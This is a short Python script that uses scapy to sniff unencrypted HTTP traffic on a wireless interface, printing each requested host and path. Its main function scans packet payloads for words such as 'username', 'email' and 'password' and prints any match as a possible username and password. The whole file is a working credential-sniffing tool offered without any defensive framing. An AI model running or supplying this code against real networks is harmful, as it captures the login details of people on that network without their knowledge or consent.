import scapy.all as scapy
from scapy.layers import http

def sniffer(interface):
    scapy.sniff(iface=interface, store=False, prn=sniffed_pack)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        inputfield = ["username", "email", "login", "sign-in", "signin", "signup", "user", "pass", "password"]
        for word in inputfield:
            if word in load:
                return load

def sniffed_pack(packet):
    if packet.haslayer(http.HTTPRequest):
        web_url = get_url(packet)
        print("[+] HTTP request on ", web_url)

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > " + login_info + "\n\n")

sniffer("wlp4s0")

